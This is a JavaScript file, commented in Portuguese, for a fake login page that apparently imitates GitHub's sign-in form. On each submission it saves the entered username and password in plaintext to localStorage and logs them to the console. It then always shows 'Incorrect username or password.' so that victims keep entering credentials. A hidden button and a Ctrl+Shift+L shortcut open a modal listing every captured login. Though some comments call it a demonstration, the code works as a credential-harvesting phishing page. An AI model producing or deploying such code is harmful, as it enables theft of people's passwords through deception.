// Array para armazenar as tentativas de login
let loginAttempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];

// Função para formatar a data e hora
function formatDateTime(date) {
  const hours = String(date.getHours()).padStart(2, "0");
  const minutes = String(date.getMinutes()).padStart(2, "0");
  const seconds = String(date.getSeconds()).padStart(2, "0");
  const day = String(date.getDate()).padStart(2, "0");
  const month = String(date.getMonth() + 1).padStart(2, "0");
  const year = date.getFullYear();

  return `${hours}:${minutes}:${seconds} ${day}/${month}/${year}`;
}

// Função para salvar tentativa de login
function saveLoginAttempt(username, password) {
  const attempt = {
    id: Date.now(),
    timestamp: new Date(),
    username: username,
    password: password,
  };

  loginAttempts.unshift(attempt); // Adiciona no início do array
  localStorage.setItem("loginAttempts", JSON.stringify(loginAttempts));

  return attempt;
}

// Função para exibir as tentativas de login no modal
function displayLoginAttempts() {
  const attemptsList = document.getElementById("loginAttemptsList");

  if (loginAttempts.length === 0) {
    attemptsList.innerHTML = `
      <div class="empty-state">
        <p>Nenhuma tentativa de login registrada ainda.</p>
      </div>
    `;
    return;
  }

  attemptsList.innerHTML = loginAttempts
    .map(
      (attempt, index) => `
    <div class="login-attempt">
      <div class="attempt-header">
        <span class="attempt-number">Tentativa ${
          loginAttempts.length - index
        }</span>
        <span class="attempt-time">${formatDateTime(
          new Date(attempt.timestamp)
        )}</span>
      </div>
      <div class="attempt-details">
        <div><strong>Email ou usuário:</strong> ${attempt.username}</div>
        <div><strong>Senha:</strong> ${attempt.password}</div>
      </div>
    </div>
  `
    )
    .join("");
}

// Função para mostrar erro
function showError(message) {
  const errorMessage = document.getElementById("error-message");
  const errorText = document.getElementById("error-text");

  errorText.textContent = message;
  errorMessage.style.display = "flex";
}

// Função para esconder erro
function hideError() {
  const errorMessage = document.getElementById("error-message");
  errorMessage.style.display = "none";
}

// Função para abrir o modal
function openModal() {
  const modal = document.getElementById("loginAttemptsModal");
  modal.style.display = "block";
  displayLoginAttempts();
}

// Função para fechar o modal
function closeModal() {
  const modal = document.getElementById("loginAttemptsModal");
  modal.style.display = "none";
}

// Adicionar funcionalidade ao botão escondido
document.getElementById("hiddenButton").addEventListener("click", openModal);

// Fechar modal quando clicar no X
document.querySelector(".close").addEventListener("click", closeModal);

// Fechar modal quando clicar fora dele
window.addEventListener("click", function (event) {
  const modal = document.getElementById("loginAttemptsModal");
  if (event.target === modal) {
    closeModal();
  }
});

// Lógica de login existente
document.getElementById("login-form").addEventListener("submit", function (e) {
  e.preventDefault();
  const username = document.getElementById("login_field").value;
  const password = document.getElementById("password").value;

  // Esconde qualquer erro anterior
  hideError();

  // Salva a tentativa de login
  saveLoginAttempt(username, password);

  // Aqui você pode adicionar a lógica de autenticação
  console.log("Login attempt:", { username, password });

  // Sempre mostra erro para demonstrar
  showError("Incorrect username or password.");

  // Limpa os campos do formulário
  document.getElementById("login_field").value = "";
  document.getElementById("password").value = "";
  document.getElementById("login_field").focus();
});

// Tecla de atalho para abrir o modal (Ctrl+Shift+L)
document.addEventListener("keydown", function (event) {
  if (event.ctrlKey && event.shiftKey && event.key === "L") {
    event.preventDefault();
    openModal();
  }
});

// Botões de login social (apenas para demonstração)
document.querySelectorAll(".btn-social").forEach((button) => {
  button.addEventListener("click", function () {
    alert("Login social ainda não implementado");
  });
});

// Passkey login (apenas para demonstração)
document.querySelector(".passkey-link").addEventListener("click", function (e) {
  e.preventDefault();
  alert("Login com passkey ainda não implementado");
});
